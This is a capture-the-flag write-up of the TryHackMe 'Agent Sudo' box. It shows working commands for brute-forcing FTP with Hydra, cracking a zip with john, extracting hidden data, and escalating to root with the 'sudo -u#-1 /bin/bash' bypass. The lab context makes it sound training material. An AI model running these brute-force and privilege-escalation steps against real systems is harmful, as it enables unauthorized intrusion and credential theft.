---
title: "THM - Agent Sudo "
author: NiBi
lang: "en"
categories : ['Try Hack Me']
tags : ['CTF', 'THM','easy','binwalk','bruteforce','hydra','ftp','ssh','stegano']
titlepage: true
toc: true
toc-own-page: true
---

# Enumeration 

## Nmap
Let's start by using nmap to see which ports are open

```shell
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
```
We have 3 services: \
-FTP\
-SSH\
-HTTP

### FTP (21)

```shell
─$ ftp 10.10.87.101 
Connected to 10.10.87.101.
220 (vsFTPd 3.0.3)
Name (10.10.87.101:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
We can't connect amously to ftp :/ \
Let's put it aside and come back to it later.


### Port 80

When we go to the ip with Firefox we have a blank page with this text:
```text
Dear agents, 

Use your own codename as user-agent to access the site. 

From,
Agent R
```

So, i guess that R is the code name of one agent.

Let's bruteforce codename from A to Z to access the website

We can use BurpSuite to do this.

First, we add tags around User-agent and burp will replace this user-agent by our text (here, all the letters of the alphabet).

![Tags](../../assets/agent_sudo/add_tags.png)

Now, we choose by what we want to replace the user-agent on each request.

![payloads](../../assets/agent_sudo/put_alph_as_letters.png)

After what we can press "start attack" and see results.

![result](../../assets/agent_sudo/looking_status.png)

By looking result we see that the status is different for "C". We have a redirection

We have this message : 

```text
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! 

From,
Agent R
```

So a user “chris” have a weak password.
We can try to bruteforce the FTP server or the SSH one.
We also discover an Agent J.

Let's use Hydra to bruteforce the FTP server with rockyou.


```shell
└─$ hydra -s 21 -l chris -P /usr/share/wordlists/rockyou.txt -t 16 10.10.87.101 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-06 10:52:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.87.101:21/
[21][ftp] host: 10.10.87.101 login: chris password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-06 10:53:29

┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ 
```

Eheh, it's worked !

Thanks to Hydra We now have chris' password.

###  Connecting to FTP with chris' creds

```shell
└─$ ftp 10.10.87.101
Connected to 10.10.87.101.
220 (vsFTPd 3.0.3)
Name (10.10.87.101:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||42608|)
150 Here comes the directory listing.
-rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt
-rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg
-rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png
226 Directory send OK.
```

In "To_agentJ.txt" we have : 
```text

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
Uh, i hate steganography...

I had no result with steghide and exiftool but with binwalk we see that a zip file is in cutie.png


```shell
└─$ binwalk cutie.png 

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
869 0x365 Zlib compressed data, best compression
34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820 0x8804 End of Zip archive, footer length: 22
```

we exctract it with binwalk -e.
```shell
└─$ binwalk cutie.png -e

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
869 0x365 Zlib compressed data, best compression
34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820 0x8804 End of Zip archive, footer length: 22


┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ ls
cute-alien.jpg cutie.png _cutie.png.extracted To_agentJ.txt

┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ cd _cutie.png.extracted 

┌──(kali㉿kali)-[~/Desktop/ctf/_cutie.png.extracted]
└─$ l 
365 365.zlib 8702.zip To_agentR.txt


└─$ unzip 8702.zip
Archive: 8702.zip
skipping: To_agentR.txt need PK compat. v5.1 (can do v4.6)
```

8702.zip is encrytped, we can use zip2john to bruteforce it.


```shell
┌──(kali@kali)-[~/Desktop/ctf/_cutie.png.extracted]
└─$ zip2john 8702.zip > hash

┌──(kali@kali)-[~/Desktop/ctf/_cutie.png.extracted]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien (8702.zip/To_agentR.txt) 
1g 0:00:00:00 DONE (2022-06-06 11:03) 1.666g/s 40960p/s 40960c/s 40960C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~/Desktop/ctf/_cutie.png.extracted]
└─$ 
```

Again, John is too strong !

Let's extract it with "7z e 8702.zip" and using alien as password.

Now, we can see the content of To_agentR.txt :

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

We have to decrypt “QXJlYTUx”. 
Using cyberchef we have.

It's just a base64 enconding.
QXJlYTUx means Area51


Now we can try to use this password with steghide to see if a message is hidden in one of the two initial pictures

```shell
└─$ steghide --extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```
Yes ! "message.txt" is inside ! Let's read it.

```shell
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Alright ! We have a login:password &#8594; james:hackerrules!

Moove to ssh !

### SSH

```shell
└─$ ssh james@10.10.87.101 
The authenticity of host '10.10.87.101 (10.10.87.101)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.87.101' (ED25519) to the list of known hosts.
james@10.10.87.101's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

System information as of Mon Jun 6 15:10:27 UTC 2022

System load: 0.0 Processes: 97
Usage of /: 39.7% of 9.78GB Users logged in: 0
Memory usage: 34% IP address for eth0: 10.10.87.101
Swap usage: 0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```

it's worked !

Because of the machine's name, i tried first “sudo -l” to see if we have any special rights.

```shell
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
(ALL, !root) /bin/bash
```

We can't run bash as root but by googling this strange syntax i saw a security bypass in sudo 1.8.27 to run bash as root despite this command

```shell
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
james@agent-sudo:~$ 
```
We have sudo 1.8.21p, our sudo version is vulnerable !

As we can see [here](https://www.exploit-db.com/exploits/47502) we can bypass "(ALL, !root) /bin/bash" by typing "sudo -u#-1 /bin/bash"

```shell
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
[REDACTED]

By,
DesKel a.k.a Agent R
root@agent-sudo:~# cat /home/james/user_flag.txt 
[REDACTED]
root@agent-sudo:~#
```

Thanks for reading ! 